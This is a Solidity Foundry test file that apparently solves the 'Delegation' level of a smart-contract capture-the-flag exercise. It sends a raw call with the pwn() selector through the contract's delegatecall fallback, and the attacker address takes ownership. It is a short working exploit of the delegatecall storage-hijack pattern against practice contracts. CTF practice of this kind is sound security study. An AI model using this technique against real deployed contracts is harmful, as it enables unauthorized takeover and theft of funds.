// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/6-Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegationCTF;
    address attacker = address(0x01);
    address receiver = address(0x02);

    function setUp() public {
        delegate = new Delegate(address(this));
        delegationCTF = new Delegation(address(delegate));

        vm.startPrank(attacker);
        vm.deal(attacker, 100 ether);
        vm.label(attacker, "attacker");
        vm.label(receiver, "receiver");
    }

    function testAttack() public {
        address(delegationCTF).call(abi.encodeWithSignature("pwn()"));

        assertEq(delegationCTF.owner(), attacker);
    }
}
